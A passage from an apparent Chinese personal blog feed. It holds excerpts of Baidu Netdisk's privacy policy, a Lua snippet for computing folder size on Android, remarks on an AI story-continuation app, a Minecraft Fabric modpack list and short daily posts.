**百度网盘服务可在任何时候为任何原因变更本服务或删除其部分功能。**百度网盘服务可在任何时候取消或终止对用户的服务。中止或终止服务后，百度网盘将尽最大努力通过合理方式通知用户。当您发现无法登录或享受服务时，可以咨询我们的在线客服。一旦服务取消或终止，用户使用本服务的权利立即终止。 一旦本服务取消或终止，用户在本服务中储存的任何信息可能无法恢复。</p><p>…</p><hr><h2 id="隐私政策"><a href="#隐私政策" class="headerlink" title="隐私政策"></a>隐私政策</h2><p>…</p><p>（2）使用百度网盘各项业务功能涉及的个人信息<br>1）设备和日志信息<br>与大多数互联网服务一样，<strong>我们的服务器会自动记录您在访问百度网盘时所发出的请求，<strong>例如您输入的</strong>搜索关键词</strong>、您使用网盘<strong>音频&#x2F;视频播放功能时的播放时长、文件大小、文件类型。<strong>您</strong>分享的链接地址</strong>、您的<strong>分享链接被他人打开&#x2F;下载的行为日志记录</strong>。您<strong>使用百度网盘以及内容商城服务时使用过或购买过的资源名称、购买记录、浏览记录、使用记录、您的硬件设备信息（设备型号、唯一设备标识符、国际移动设备身份码IMEI、网络设备硬件地址MAC、广告标识符IDFA、设备应用安装列表等）、操作系统的版本、网络运营商的信息、您访问服务的日期、时间、时长，场景采集的个人信息：DHCP信息（可能包含：本地IP地址等）、扫描无线局域网活的的SSID列表、用户配置过的无线网络SSID列表、已链接的无线网络信息（可能包含：MAC地址、SSID、IP地址等）</strong>，这类信息是为提供服务必须收集的基础信息。</p><p>…</p><p>（五）为您提供智能化的服务<br>为了帮助您更好地查找和管理图片，百度网盘依托AI技术，将您图片中的人脸、地点、事物和文字等元素标签进行智能化自动分类。您可以为您相册内的人脸添加标签（如妈妈、弟弟、小明等），从而使您可以通过搜索功能快速地查找到您需要的图片（例如输入：北京市、天空、弟弟等）；您也可以尝试检索图片中包含的文字信息来查找到您需要的图片。根据您的参与、授权，我们可能会<strong>利用您主动提供的图片训练图像识别算法，提高服务的质量</strong>，但我们不会单独存储您的图片信息，也不会在该场景之外使用您的图片。如需关闭人脸分类功能和故事功能，可在【我的–设置-隐私设置—智能分类人脸分组／识别照片自动生成故事】进行设置，关闭后您已标记的人脸标签信息将被删除，人脸分类的相关功能将不可使用。</p><p>…</p><p>为了给您推荐性价比更高的商品，百度网盘<strong>将收集您的使用行为数据（如下载次数、下载文件大小等）</strong>，为您推荐可以满足您需求的高性价比<strong>商品</strong>。但我们不会收集您文件的详细信息，也不会在该场景之外使用您的文件。如需关闭商品推荐，可在【我的-设置-隐私设置-商品推荐设置】进行设置。</p><p>…</p><p>请注意，在以下情形中，收集、使用个人信息无需事先征得您的授权同意：</p><p>1. 与国家安全、国防安全直接相关的；<br>2. 与公共安全、公共卫生、重大公共利益直接相关的；<br>3. 与犯罪侦查、起诉、审判和判决执行等直接有关的；<br>4. <strong>出于维护您或其他个人的生命、财产等重大合法权益但又很难得到本人同意的；</strong><br>5. 所收集的个人信息是您自行向社会公众公开的；<br>6. 从合法公开披露的信息中收集个人信息的，如合法的新闻报道、政府信息公开等渠道；<br>7. <strong>根据您的要求签订和履行合同所必需的；</strong><br>8. 用于维护所提供的产品或服务的安全稳定运行所必需的，例如发现、处置产品或服务的故障；<br>9. <strong>为开展合法的新闻报道所必需的；</strong><br>10. <strong>出于公共利益开展统计或学术研究所必要，且其对外提供学术研究或描述的结果时，对结果中所包含的个人信息进行去标识化处理的；</strong><br>11. 法律法规规定的<strong>其他</strong>情形。</p><p>…</p><p>（一）共享<br>除非经过您本人事先授权同意，我们不会向第三方共享、转让您的个人信息，<strong>但经过处理无法识别特定个人且不能复原的除外。</strong></p><p>…</p><p>（2）广告、咨询类服务商&#x2F;广告主。未经您授权，我们不会将您的个人信息与提供广告、咨询类服务商共享。但我们可能<strong>会将经处理无法识别您的身份且接收方无法复原的信息，例如经匿名化处理的用户画像，与广告或咨询类服务商或广告主共享</strong>，以帮助其在不识别您个人的前提下，提升广告有效触达率，以及分析我们的产品和服务使用情况等。</p><p>…</p><p>（3）第三方SDK服务商。为保证向您提供本隐私政策目的所述的服务，我们可能会接入由第三方提供的软件开发包（SDK）以实现相关功能，用于更好地提高客户服务和用户体验。此时，这些第三方SDK服务商可能代表百度网盘或出于本隐私政策的一项或多项目的收集您的个人信息。目前，我们接入的第三方SDK主要包括以下几种类型：</p><p>…<br>g. 产品模块性能优化，包括提高硬件配网能力、<strong>功能热修复</strong>、交互分析、网络性能及网络错误监控等；</p><p>…</p><p>如果您对我们的回复不满意，特别是您认为我们的个人信息处理行为损害了您的合法权益，您还可以通过以下外部途径寻求解决方案：向【<strong>北京市海淀区人民法院</strong>提起诉讼】。</p><p>…</p>]]></content>
    
    
    <categories>
      
      <category>一些日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
      <tag>网盘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FA重置版停更</title>
    <link href="/archives/549/"/>
    <url>/archives/549/</url>
    
    <content type="html"><![CDATA[<p>发现FA重置版停更了</p><p>坏<br>太坏了</p><p>是迁移到 LuaGoX工具箱 还是 FusionApp2.0</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSDN</title>
    <link href="/archives/547/"/>
    <url>/archives/547/</url>
    
    <content type="html"><![CDATA[<p>CSDN：</p><p><img src="https://z3.ax1x.com/2021/09/07/hIrN79.jpg" alt="炒"></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>程序</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>杰出兽安卓APP不提供蓝奏云</title>
    <link href="/archives/527/"/>
    <url>/archives/527/</url>
    
    <content type="html"><![CDATA[<p>我刚做了一个违背祖宗的决定</p><p>接下来 杰出兽安卓APP 将不提供源码下载以及蓝奏云下载渠道</p><p>你仍然可以从城通网盘和本地服务器下载 杰出兽安卓APP 但将不提供源码下载</p><p>主要是每次版本更新都上传都太麻烦了，而且反正没人看</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>杰出兽安卓APP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lua 不使用 lfs 库获取文件夹大小</title>
    <link href="/archives/522/"/>
    <url>/archives/522/</url>
    
    <content type="html"><![CDATA[<p>Lua 只能获取单个文件大小，且常规获取文件夹属性、大小的方式通常需要 require lfs</p><p>许多时候要检测文件夹大小但不能使用 lfs 比如 AndroLua 和基于它的 FusionApp 等</p><p>以下代码</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs lua">import<span class="hljs-string">&quot;java.io.File&quot;</span><span class="hljs-comment">--Java 文件接口库</span><br>import <span class="hljs-string">&quot;android.text.format.Formatter&quot;</span><span class="hljs-comment">-- 格式化大小库</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">FormatFileSize</span><span class="hljs-params">(size)</span></span><span class="hljs-comment">--格式化文件大小</span><br>  <span class="hljs-keyword">return</span> Formatter.formatFileSize(activity, size)<br><span class="hljs-keyword">end</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFolderSize</span><span class="hljs-params">(path)</span></span><span class="hljs-comment">--计算文件夹大小</span><br>  <span class="hljs-keyword">local</span> ls = File(<span class="hljs-built_in">path</span>).listFiles()<br>  <span class="hljs-keyword">if</span> ls <span class="hljs-keyword">then</span><br>    <span class="hljs-keyword">local</span> fileList = luajava.astable( ls )<span class="hljs-comment">--格式</span><br>    Size=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">ipairs</span>(fileList) <span class="hljs-keyword">do</span><span class="hljs-comment">--循环遍历文件夹</span><br>      <span class="hljs-keyword">if</span> v.isDirectory() <span class="hljs-keyword">then</span> <span class="hljs-comment">--是目录</span><br>        <span class="hljs-keyword">local</span> v\_=<span class="hljs-built_in">tostring</span>(v)..<span class="hljs-string">&#x27;/&#x27;</span><span class="hljs-comment">--套娃</span><br>        Size=Size+GetFolderSize(v\_)<br>      <span class="hljs-keyword">else</span><br>        Size=Size+File(<span class="hljs-built_in">tostring</span>(v)).length()<span class="hljs-comment">--获取</span><br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">else</span><br>    Size=<span class="hljs-number">0</span><span class="hljs-comment">--空目录大小为0</span><br>  <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">return</span> Size<br><span class="hljs-keyword">end</span><br><br><span class="hljs-comment">--使用示例</span><br><span class="hljs-built_in">print</span>(FormatFileSize(GetFolderSize(<span class="hljs-string">&#x27;/sdcard/Download/&#x27;</span>)))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>简单技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
      <tag>AndroLua</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BiliBili国际版</title>
    <link href="/archives/519/"/>
    <url>/archives/519/</url>
    
    <content type="html"><![CDATA[<p>这是个什么东西？</p><p><a href="https://play.google.com/store/apps/details?id=com.bstar.intl">https://play.google.com/store/apps/details?id=com.bstar.intl</a></p><p><img src="https://z3.ax1x.com/2021/09/06/hfNdjP.jpg" alt="Bilibili Play 东南亚版"></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>哔哩哔哩</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>呐呐呐</title>
    <link href="/archives/515/"/>
    <url>/archives/515/</url>
    
    <content type="html"><![CDATA[<p>艹 推荐真的全是呐呐呐</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>哔哩哔哩</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AI 续写-彩云小梦</title>
    <link href="/archives/498/"/>
    <url>/archives/498/</url>
    
    <content type="html"><![CDATA[<p>彩云小梦是一个 AI 续写工具</p><p>这个彩云小梦<a href="https://b23.tv/MftmVd">之前我关注过</a>，之后有过几次“维护”，主要是文章内容更拘谨了，还加上了敏感词机制</p><p>彩云小梦的彩云就是之前彩云天气、彩云小译的彩云。彩云小译也算是国内为数不多伪同声传译和谷歌翻译效果差不多的翻译软件了，比某翻译君、某爱翻译强的不知道哪里去了</p><p>昨天晚上（2021.9.1 20:00）彩云小译出了正式版，还在B站开了发布会。我没看，不过大概就是录屏 PPT 吹水。发布了彩云小译的安卓 IOS 手机客户端（感觉不算网页套壳，安卓安装包就有 20M），还有平行世界模式，可以拆出多条支线内容</p><p>自带写作风格分为普通、言情、纯爱和玄幻，其中普通又分为 0 号推进剧情模式和 1 号细节模式（大概就是平凡模式和激进模式）<br>之后好像还能定制模型</p><p><img src="https://z3.ax1x.com/2021/09/02/hr5Dvd.png" alt="彩云小梦写的文章"></p><p>就目前这个彩云小梦比<a href="https://spread.sm.cn/education/aiwriting/home#/">夸克AI续写</a>厉害的多。现在训练完自己的模型，之后大概是要收费的（我猜一年 500-800？）</p><p>之前B站上有流行过一段时间把知名名场面用AI续写出来的视频，大概就是这个彩云小梦</p><p>具体原理的话应该和 <a href="https://copilot.github.com/">Github Copilot</a> 一样都是 GPT-2 用了大量网文训练</p><p><img src="https://z3.ax1x.com/2021/09/02/hr7zY6.png" alt="彩云小梦写的文章"></p><p>现在的能力大概就是整活了吧。也许对一些网文作者有一些帮助</p><p>感觉连帮你水作文都不行，经常会写到一些毫不相干的东西</p><p><img src="https://z3.ax1x.com/2021/09/02/hrxrYd.png" alt="彩云小梦写的文章"></p><p>经常写出无限粘贴</p><p><img src="https://z3.ax1x.com/2021/09/02/hr5sKA.png" alt="彩云小梦写的文章"></p><p>并没有什么特别的</p><p><img src="https://z3.ax1x.com/2021/09/02/hrxsfA.png" alt="彩云小梦写的文章"></p><p>叔叔是干什么了被这样迫害🥵</p><p><img src="https://z3.ax1x.com/2021/09/02/hrx6SI.png" alt="彩云小梦写的文章"></p><p>？？？？？？？</p>]]></content>
    
    
    <categories>
      
      <category>一些日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>AI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>----</title>
    <link href="/archives/480/"/>
    <url>/archives/480/</url>
    
    <content type="html"><![CDATA[<p>确实离谱</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WinXP是20年前的系统了</title>
    <link href="/archives/478/"/>
    <url>/archives/478/</url>
    
    <content type="html"><![CDATA[<p>你知道吗？</p><p>Windows XP已经是个20年前的系统了哦</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MAGISK IS BACK</title>
    <link href="/archives/468/"/>
    <url>/archives/468/</url>
    
    <content type="html"><![CDATA[<p>MAGISK IS BACK</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>萌国ICP备案</title>
    <link href="/archives/464/"/>
    <url>/archives/464/</url>
    
    <content type="html"><![CDATA[<p>萌国ICP备案是什么？</p><p><a href="https://icp.gov.moe/">https://icp.gov.moe</a></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>超级优化懒人包-Minecraft高版本Fabric生存</title>
    <link href="/archives/394/"/>
    <url>/archives/394/</url>
    
    <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p><strong>版本：</strong><br>1.17.1、1.17、1.16.5</p><p><strong>特点：</strong><br>懒人包，即下即用，配置文件及设置合适<br>基本不影响原版游戏机制<br>大量优化模组，且不含Optfine<br>实用，环境效果好，不含Optfine也有Optfine大多数功能<br>附带资源包、光影<br>终末之诗闪烁标语等汉化，支持OF赞助披风</p><p><strong>注意事项：</strong><br>1.17.1部分情况帧率不稳定—–大概是优化模组太多了,互相打架,可以关掉几个<br>Optfine的部分资源包有显示问题—–原版多好看啊！要什么材质<br>部分模组设置页无汉化—–这么几个字看不懂？<br>1.16.5的视频设置页部分无汉化,1.17及以上正常汉化—–这么几个字看不懂？<br>ComplementaryShaders 设置页无汉化—–光影设置使用频率又不高,OCR翻译是个好东西<br>全屏输入法模组需要 <a href="https://support.microsoft.com/zh-cn/topic/%E6%9C%80%E6%96%B0%E6%94%AF%E6%8C%81%E7%9A%84-visual-c-%E4%B8%8B%E8%BD%BD-2647da03-1eea-4433-9aff-95f26a218cc0">Visual C++运行库</a> 不是什么精简版的系统一般都有<br>游戏在后台时自动钓鱼可能无法运行—–禁用铁氧体磁芯即可<br>开启F3时帧率可能有损失—–不要用F3看帧率<br>箱子没有打开关闭动画—–禁用箱子优化即可</p><h2 id="内容列表"><a href="#内容列表" class="headerlink" title="内容列表"></a>内容列表</h2><p><strong>提示：</strong><br>点击左上角三横杠查看目录，更清楚</p><h2 id="模组"><a href="#模组" class="headerlink" title="模组"></a>模组</h2><h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><p>模组名</p><p>主要作用</p><p>相关链接</p><p>备注</p><p>FabricAPI</p><p>FabricAPI 库</p><p><a href="https://fabricmc.net/">官网</a></p><p>Architectury API</p><p>运行库</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/architectury-fabric">Curseforge</a></p><p>ClothAPI</p><p>运行库</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/cloth-api">CurseForge</a></p><p>不在1.16.5</p><p>Cloth Config API</p><p>许多模组的设置页</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/cloth-config">CurseForge</a></p><p>不在1.16.5</p><p>Fabric Language Kotlin</p><p>运行库</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/architectury-fabric">Curseforge</a></p><p>MaLiLib</p><p>masa 系列模组前置</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/malilib">Curseforge</a></p><p>OF披风(OF Capes)</p><p>显示OF披风</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/of-capes">CurseForge</a></p><p>TRansliterationLib</p><p>运行库</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/transliterationlib">CurseForge</a></p><p>模组菜单(Modmenu)</p><p>许多模组的设置页</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/modmenu">CurseForge</a></p><p>万用皮肤补丁(CustomSkinLoader)</p><p>皮肤补丁,自定义披风</p><p><a href="https://github.com/xfl03/MCCustomSkinLoader">Github</a></p><p>铟(indium)</p><p>让 Fabric 渲染 API 与钠共存</p><p><a href="https://modrinth.com/mod/indium">Modrinth</a></p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>模组名</p><p>主要作用</p><p>相关链接</p><p>备注</p><p>OK缩放(OK Zoomer)</p><p>C键放大,滚轮调远近,中键归位</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/ok-zoomer">CurseForge</a></p><p>替代Optfine</p><p>RNG无限耐久附魔预测(clientcommands)</p><p>游戏内自动计算随机种子,开纪</p><p><a href="https://github.com/Earthcomputer/clientcommands">Github</a></p><p>崩溃优化(Not Enough Crashes)</p><p>游戏崩溃时可以查看崩溃原因并返回标题画面继续</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/not-enough-crashes">CurseForge</a></p><p>回放(Replay Mod)</p><p>回放录制,编辑镜头轨迹按帧渲染</p><p><a href="https://replaymod.com/">官网</a></p><p>轻松放置(Tweakeroo)</p><p>潜影盒预览,自由镜头, 轻松放置等</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/tweakeroo">CurseForge</a></p><p>masa</p><p>体素地图(Voxel Map)</p><p>小地图</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/voxelmap">CurseForge</a></p><p>投影(Litematica)</p><p>辅助你造工程,Xray</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/litematica">CurseForge</a></p><p>masa</p><p>细微的界面修改(‘Slight’ Gui Modifications)</p><p>界面动画.显示FPS</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/slight-gui-modifications">CurseForge</a></p><p>整理背包(Inventory Profiles Next)</p><p>一键背包整理Next</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/inventory-profiles-next">CurseForge</a></p><p>masa</p><p>自动钓鱼(Autofish)</p><p>自动钓鱼,挂机赚大钱</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/autofish">CurseForge</a></p><h3 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h3><p>模组名</p><p>主要作用</p><p>相关链接</p><p>备注</p><p>更好的F3(BetterF3)</p><p>使F3调试界面可定制与更具可读性</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/betterf3">Curseforge</a></p><p>耐久信息显示(DurabilityViewer)</p><p>显示装备等耐久</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/giselbaers-durability-viewer">CurseForge</a></p><p>苹果皮(AppleSkin)</p><p>显示饱和度.食物价值,让你节约粮食</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/appleskin">CurseForge</a></p><p>燃料信息(FuelInfo)</p><p>显示燃料还能烧多少东西</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/fuel-info">CurseForge</a></p><p>我进行了汉化.仅在 1.17.1</p><p>伤害显示(ToroHealth)</p><p>显示血量.伤害</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/torohealth-damage-indicators">CurseForge</a></p><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>模组名</p><p>主要作用</p><p>相关链接</p><p>备注</p><p>Lamb动态光源(LambDynamicLights)</p><p>动态光源</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/lambdynamiclights">CurseForge</a></p><p>替代Optfine</p><p>动态音效过滤(Dynamic Sound Filters)</p><p>部分场景下的音效加混响,200平火柴盒</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/dynamic-sound-filters">CurseForge</a></p><p>我把它修改到了1.17.x</p><p>更多动画(Not Enough Animations)</p><p>修改添加部分动画</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/not-enough-animations">CurseForge</a></p><p>依赖 TRansliterationLib</p><p>更好的草(LambdaBetterGrass Modrinth)</p><p>更好的草和更好的雪</p><p><a href="https://modrinth.com/mod/lambdabettergrass">Modrinth</a></p><p>依赖 铟</p><p>更真实的第一人称模型(First-person Model)</p><p>显示纸娃娃</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/first-person-model">CurseForge</a></p><p>依赖 TRansliterationLib</p><p>连接材质Fabric版(ConnectedTexturesMod for Fabric)</p><p>连接玻璃等的材质</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/ctm-fabric">CurseForge</a></p><p>依赖 铟.替代Optfine</p><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><p>模组名</p><p>主要作用</p><p>相关链接</p><p>备注</p><p>C2ME(C^2M-Engine)</p><p>优化区块加载读写</p><p><a href="https://github.com/ishlandbukkit/C2ME-fabric">Github</a></p><p>不在 1.16.5</p><p>床优化(Better Beds)</p><p>优化床</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/better-beds">CurseForge</a></p><p>带有渲染器设置的IRIS渲染器(Iris Starline)</p><p>自定义渲染器</p><p><a href="https://github.com/HyperCubeMC/Iris">Github</a></p><p>支持带有渲染器设置的IRIS渲染器的钠(Sodium for Starline Iris Fork)</p><p>极大地提高帧率</p><p><a href="https://github.com/HyperCubeMC/sodium-fabric">Github</a></p><p>动态FPS(Dynamic FPS)</p><p>自动降低游戏在未聚焦时的游戏帧数</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/dynamic-fps">CurseForge</a></p><p>氪(Krypton)</p><p>优化网络堆栈</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/krypton">Curseforge</a></p><p>懒惰DFU(LazyDFU)</p><p>优化启动速度</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/lazydfu">CurseForge</a></p><p>锂(Lithium)</p><p>优化游戏的物理和怪物AI等的整体性能</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/lithium">CurseForge</a></p><p>平滑启动(Smooth Boot)</p><p>优化启动时的性能占用</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/smooth-boot">Curseforge</a></p><p>磷(phosphor)</p><p>优化光照引擎</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/phosphor">CurseForge</a></p><p>仅在 1.16.5</p><p>氢(Hydrogen)</p><p>优化内存占用</p><p><a href="https://modrinth.com/mod/hydrogen">Modrinth</a></p><p>全屏输入法(IngameIME)</p><p>全屏时也有输入法候选框</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/ingameime/">CurseForge</a></p><p>除了 1.16.5 依赖 Cloth API.Fabric Language Kotlin.Cloth Config API</p><p>实体剔除(Entity Culling)</p><p>优化实体渲染</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/entity-culling">Curseforge</a></p><p>输入法冲突修复(IMBlockerFabric)</p><p>不用在打字时切换输入法</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/imblockerfabric">CurseForge</a></p><p>树叶优化(Cull Leaves)</p><p>优化树叶</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/cull-leaves">CurseForge</a></p><p>铁氧体磁芯(FerriteCore)</p><p>优化内存占用</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/ferritecore-fabric">CurseForge</a></p><p>箱子优化(FastChest)</p><p>优化箱子</p><p><a href="https://www.curseforge.com/minecraft/mc-mods/fastchest">CurseForge</a></p><p>星光(Starlight)</p><p>优化光照引擎</p><p><a href="https://github.com/PaperMC/Starlight">Github</a></p><p>不在1.16.5</p><h2 id="资源包"><a href="#资源包" class="headerlink" title="资源包"></a>资源包</h2><p>资源包名</p><p>主要作用</p><p>相关链接</p><p>备注</p><p>Masa全家桶汉化</p><p>汉化 masa 全家桶</p><p><a href="https://www.bilibili.com/read/cv6590190/">哔哩哔哩</a></p><p>默认启用</p><p>汉化游戏文本+</p><p>汉化制作人员名单.终末之诗.闪烁标语并添加修改一些内容</p><p><a href="https://github.com/jiesou/Minecraft-Text-Sinicization/tree/plus">Github</a></p><p>默认启用</p><p>连接纹理(MC Connected CTM)</p><p>与连接材质Fabric版模组配合</p><p><a href="https://www.curseforge.com/minecraft/texture-packs/mc-connected-ctm">Curseforge</a></p><p>默认启用</p><p>连接纹理修复(Glass Panes CTM Fix)</p><p>修复玻璃板上下的缝</p><p><a href="https://www.curseforge.com/minecraft/texture-packs/glass-panes-ctm-fix">CurseForge</a></p><p>默认启用</p><p>血量显示(Entity Healthbars)</p><p>生物上方显示浮动血量</p><p><a href="https://www.curseforge.com/minecraft/texture-packs/entity-healthbars/">CurseForge</a></p><p>伤害显示模组和光影冲突,默认只显示指向实体的血量</p><h2 id="光影"><a href="#光影" class="headerlink" title="光影"></a>光影</h2><p>光影名</p><p>特点</p><p>相关链接</p><p>备注</p><p>BSL 8.0.01 汉化</p><p>高自定义,高帧率</p><p><a href="https://www.bilibili.com/read/cv10496453/">哔哩哔哩</a></p><p>ComplementaryShaders 4.1</p><p>基于BSL,迷雾效果好</p><p><a href="https://www.curseforge.com/minecraft/customization/complementary-shaders">CurseForge</a></p><p>默认启用</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="http://ctpan.jiecs.top/f/32856022-509626474-886428">城通网盘</a> <a href="https://jiecs-my.sharepoint.com/:u:/g/personal/i_jiecs_onmicrosoft_com/EbmDZRFVOYZBgQATcW2pw_cBbd0OqeZUSDdG0Y0M6whYDw?e=CcWyu1">OneDrive</a> 1.38G 包括了所有版本 正常网络,多线程速度不会差太多</p><p>蓝奏云 限制单文件大小100M，且无法上传分卷压缩<br>阿里云盘 无法分享zip文件<br>坚果云 一月上传流量仅1G</p>]]></content>
    
    
    <categories>
      
      <category>简单技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Minecraft</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>城通盘+IDM</title>
    <link href="/archives/454/"/>
    <url>/archives/454/</url>
    
    <content type="html"><![CDATA[<p>城通盘链接用IDM下</p><p><img src="https://z3.ax1x.com/2021/08/27/hQIBdO.png" alt="城通网盘 IDM 2&#x2F;4线程 2.58MB&#x2F;秒"></p><p>惊了，比 Onedrive 还快</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>蓝奏云禁止分卷压缩</title>
    <link href="/archives/444/"/>
    <url>/archives/444/</url>
    
    <content type="html"><![CDATA[<p>蓝奏云什么时候开始禁止分卷压缩还限制格式了？</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>哔哩哔哩</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>石选之人</title>
    <link href="/archives/379/"/>
    <url>/archives/379/</url>
    
    <content type="html"><![CDATA[<p>我的运气为什么浪费在这种奇怪的地方了</p><p><img src="https://z3.ax1x.com/2021/08/26/he41YV.png" alt="哔哩哔哩私信"></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>哔哩哔哩</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>停电了</title>
    <link href="/archives/370/"/>
    <url>/archives/370/</url>
    
    <content type="html"><![CDATA[<p>刚刚停电了十几分，好家伙我直接好家伙，属于是想起上次停电属于是了还是上次属于是了。因为停电了，所以停电了简直就是简直了，抛开时间不谈，这次恢复的还挺快的</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Minecraft-Text-Sinicization</title>
    <link href="/archives/366/"/>
    <url>/archives/366/</url>
    
    <content type="html"><![CDATA[<p>把Minecraft Java 中的制作人员名单、终末之诗和闪烁标语汉化了<br>做成了资源包</p><p>看项目页</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Minecraft</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Minecraft版本整理</title>
    <link href="/archives/337/"/>
    <url>/archives/337/</url>
    
